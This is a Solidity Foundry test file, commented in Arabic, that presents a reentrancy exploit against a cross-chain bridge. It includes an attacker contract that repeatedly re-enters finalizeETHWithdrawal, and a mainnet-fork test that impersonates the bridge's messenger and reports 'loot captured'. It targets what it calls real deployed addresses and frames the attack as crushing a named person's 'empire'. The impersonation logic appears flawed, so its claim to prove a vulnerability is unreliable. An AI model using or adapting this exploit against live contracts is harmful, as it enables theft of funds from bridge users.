// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- الجزء الأول: الواجهات المستخرجة من روابط مايكل ---
interface IL1StandardBridge {
    function finalizeETHWithdrawal(
        address _from, address _to, uint256 _amount, bytes calldata _data
    ) external payable;
}

// --- الجزء الثاني: عقد المهاجم (الخنجر الذي سيطعن الجسر) ---
contract AttackerContract {
    IL1StandardBridge public bridge;
    uint256 public count;

    constructor(address _bridge) {
        bridge = IL1StandardBridge(_bridge);
    }

    function attack() external payable {
        bridge.finalizeETHWithdrawal(address(this), address(this), 0.1 ether, "");
    }

    // هنا تقع إعادة الدخول: الجسر يرسل المال، فنعود إليه قبل أن يغلق المعاملة
    receive() external payable {
        if (count < 4) { // سنكرر السحب 4 مرات إضافية
            count++;
            bridge.finalizeETHWithdrawal(address(this), address(this), 0.1 ether, "");
        }
    }
}

// --- الجزء الثالث: سيناريو الإثبات وسحق إمبراطورية مايكل ---
contract MichaelEmpireCrusher is Test {
    // العناوين الحقيقية من الروابط
    address payable constant BRIDGE_PROXY = payable(0x99C9fc46f92E8a1c0deC1b1747d010903E884bE1);
    address constant MESSENGER = 0x25ace71c97B33Cc4729CF772ae268934F7ab5fA1;

    AttackerContract attacker;

    function setUp() public {
        // عمل محاكاة للشبكة الحقيقية (Fork)
        vm.createSelectFork("https://eth.llamarpc.com" );
        attacker = new AttackerContract(BRIDGE_PROXY);
        vm.deal(address(attacker), 1 ether);
    }

    function testProofOfVulnerability() public {
        console.log("Starting the assault on Michael's Bridge...");
        uint256 initialBridgeBalance = BRIDGE_PROXY.balance;

        // انتحال شخصية المسنجر الذي يثق به مايكل
        vm.prank(MESSENGER);

        // تنفيذ الهجوم
        attacker.attack();

        console.log("--- Forensic Evidence ---");
        console.log("Initial Bridge Balance:", initialBridgeBalance / 1e18, "ETH");
        console.log("Final Bridge Balance:  ", BRIDGE_PROXY.balance / 1e18, "ETH");
        console.log("Loot Captured:         ", address(attacker).balance / 1e18, "ETH");

        // الإثبات: إذا سحبنا أكثر مما أودعنا، فقد انهار الأمان
        assertTrue(address(attacker).balance > 0.1 ether, "Security is still holding!");
        console.log("VICTORY: The bridge logic is broken.");
    }
}
